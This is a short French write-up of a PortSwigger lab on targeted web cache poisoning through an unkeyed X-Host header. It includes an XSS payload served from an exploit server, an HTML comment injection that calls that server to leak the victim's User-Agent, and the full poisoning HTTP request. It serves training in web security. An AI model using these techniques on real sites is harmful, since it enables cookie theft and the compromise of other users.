# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

## Payload

Avec `Param Miner` on trouve un header `X-Host` qui est un unkey header.

`x-host: exploit-0a1500a3036fb39381e0c512017f0062.exploit-server.net`

Dans l'exploit server, on crée la ressource `/resources/js/tracking.js` avec le contenu :

```js
alert(document.cookie);
```

On arrive bien a trigger la XSS sur mon navigateur mais on voit dans les headers de la réponse que le header `Vary` est présent : `Vary: User-Agent`.

Ce qui nous indique que le cache se base aussi sur le User-Agent pour desservir les ressources.

Il nous faut donc trouver le User-Agent de la victime.

Sur la page d'un article on a la possibilité de mettre uncommentaire et on voit qu'il est écrit `HTML comments are allowed`.

On peut donc injecter `<img src="http://exploit-0a1500a3036fb39381e0c512017f0062.exploit-server.net">` dans le commentaire pour provoquer une requête vers notre Burp Collaborator et extraire le User-Agent de la victime.

Ensuite, on peut re-essayer notre attaque avec le User-Agent de la victime et on voit que le header `Vary` n'est plus présent.

```
GET / HTTP/1.1
Host: 0a98001603a305f38770206800460003.h1-web-security-academy.net
Cookie: session=GhWNBxNW1MXs125ENbGjUW9Yo1k9H0Rv
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
x-host: exploit-0a18004a0339050987c01f4401d100f2.exploit-server.net
```